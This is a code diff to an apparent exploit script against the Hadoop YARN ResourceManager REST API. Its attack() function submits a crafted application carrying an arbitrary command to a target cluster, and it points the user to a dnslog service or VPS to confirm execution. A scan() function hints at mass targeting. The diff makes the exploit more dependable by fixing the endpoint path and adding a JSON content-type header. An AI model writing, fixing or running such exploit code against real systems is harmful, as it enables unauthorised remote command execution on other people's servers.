@@ -41,7 +41,7 @@ def attack(target_url,command):
     app_id = reps_1.json()['application-id']
 
     appnames = "hello"+str(random.randint(100,500))
-    url_2 = target_url + '/ws/v1/cluster/apps'
+    url_2 = target_url + '/ws/v1/cluster/apps/'
     data = {
         'application-id': app_id,
         'application-name': appnames,
@@ -52,7 +52,10 @@ def attack(target_url,command):
         },
         'application-type': 'YARN',
     }
-    requests.post(url_2, json=data)
+    headers = {
+        'Content-Type':'application/json'
+    }
+    requests.post(url_2, json=data, headers=headers)
     print("[+] Please check the result on dnslog platform or you VPS.")
 
 def scan(file):
